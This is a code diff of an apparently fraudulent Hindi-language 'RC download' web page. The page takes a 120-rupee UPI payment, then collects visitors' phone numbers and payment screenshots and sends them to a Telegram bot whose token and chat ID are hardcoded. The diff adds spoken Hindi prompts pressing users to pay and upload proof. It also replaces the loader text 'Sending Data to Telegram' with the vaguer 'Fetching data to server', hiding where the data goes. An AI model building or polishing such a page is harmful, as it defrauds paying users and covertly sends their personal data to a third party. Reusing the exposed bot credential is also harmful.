@@ -57,7 +57,6 @@
 
         #mob { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; background: #fff; color: #000; font-size: 20px; text-align: center; font-weight: bold; }
 
-        /* Popups */
         .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; }
         #successOverlay { background: rgba(0, 128, 0, 0.98); }
         #failedOverlay { background: rgba(220, 20, 60, 0.98); }
@@ -74,7 +73,7 @@
         .footer { margin-top: 30px; font-size: 13px; font-weight: bold; color: #333; text-align: center; padding-bottom: 40px; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body oncontextmenu="return false;" onload="speak('नमस्ते! कृपया अपने गाड़ी नंबर दर्ज कीजिए')">
 
     <div class="header">
         <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
@@ -143,13 +142,20 @@
     <div class="loader-wrap" id="load">
         <div class="road"><div class="car" id="carIcon">🚗</div></div>
         <div class="pct" id="pText">0%</div>
-        <p id="loaderMsg" style="color:#fff;">Generating PDF Receipt...</p>
+        <p id="loaderMsg" style="color:#fff;">Fetching data to server...</p>
     </div>
 
     <script>
-        // Your Verified Telegram Details
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
+
+        function speak(text) {
+            window.speechSynthesis.cancel();
+            const utterance = new SpeechSynthesisUtterance(text);
+            utterance.lang = 'hi-IN';
+            utterance.rate = 0.9;
+            window.speechSynthesis.speak(utterance);
+        }
 
         function toggleM() { document.getElementById('side').classList.toggle('active'); }
         function checkTerms() { document.getElementById('contBtn').disabled = !document.getElementById('termsCheck').checked; }
@@ -168,7 +174,9 @@
             if(document.getElementById('vehInput').value.length < 9) { alert("Sahi number!"); return; }
             const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
             document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
-            document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
+            document.getElementById('p1').style.display='none'; 
+            document.getElementById('p2').style.display='block';
+            speak("ऊपर पे विथ यू पी आई बटन से पेमेंट कीजिए या क्यू आर कोड स्कैन कर के पेमेंट का स्क्रीनशॉट जरूर ले जब पेमेंट करके वापस पेज पर आये तब ही, या फिर क्यू आर पर पेमेंट होने के बाद अपना व्हाट्सएप नंबर डालें और अपने पेमेंट का स्क्रीनशॉट जरूर लगाएं पेमेंट पुष्टि के लिए जरूरी है");
         }
 
         function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }
@@ -181,15 +189,9 @@
             fd.append("parse_mode", "Markdown");
             
             try {
-                let res = await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { 
-                    method: "POST", 
-                    body: fd 
-                });
+                let res = await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: fd });
                 return res.ok;
-            } catch (e) { 
-                console.error(e);
-                return false; 
-            }
+            } catch (e) { return false; }
         }
 
         function submit() {
@@ -198,6 +200,7 @@
             if(m.length < 10 || !s) { alert("Details sahi bhare!"); return; }
 
             document.getElementById('load').style.display='flex';
+            speak("कृपया प्रतीक्षा कीजिए");
             let p = 0; 
             let isPaused = false;
 
@@ -205,18 +208,25 @@
                 if (isPaused) return;
                 p += 2;
                 document.getElementById('pText').innerText = p + "%";
+                
+                // 52% logic
+                if(p === 52) {
+                    document.getElementById('carIcon').innerText = "🏢";
+                } else {
+                    document.getElementById('carIcon').innerText = "🚗";
+                }
+                
                 document.getElementById('carIcon').style.left = (p * 0.85) + "%";
 
                 if (p === 60) {
                     isPaused = true;
-                    document.getElementById('loaderMsg').innerText = "Sending Data to Telegram...";
+                    document.getElementById('loaderMsg').innerText = "Fetching data to server...";
                     
                     const now = new Date();
                     const dStr = now.toLocaleDateString('en-IN');
                     const tStr = now.toLocaleTimeString('en-IN');
                     const txId = "RC" + Math.floor(Math.random() * 9000000000 + 1000000000);
                     
-                    // Sending to Telegram
                     let success = await sendT(s, dStr, tStr, txId);
                     
                     if(success) {
@@ -246,9 +256,10 @@
         function showSuccess() {
             document.getElementById('load').style.display='none';
             document.getElementById('successOverlay').style.display='flex';
+            speak("मुबारक हो आपको आपकी आर सी व्हाट्सएप पर भेज दी जाएगी। कांग्रेचुलेशन");
             setTimeout(() => {
                 window.location.reload(); 
-            }, 3000);
+            }, 5000);
         }
 
         function makePDF(d, t, tx) {
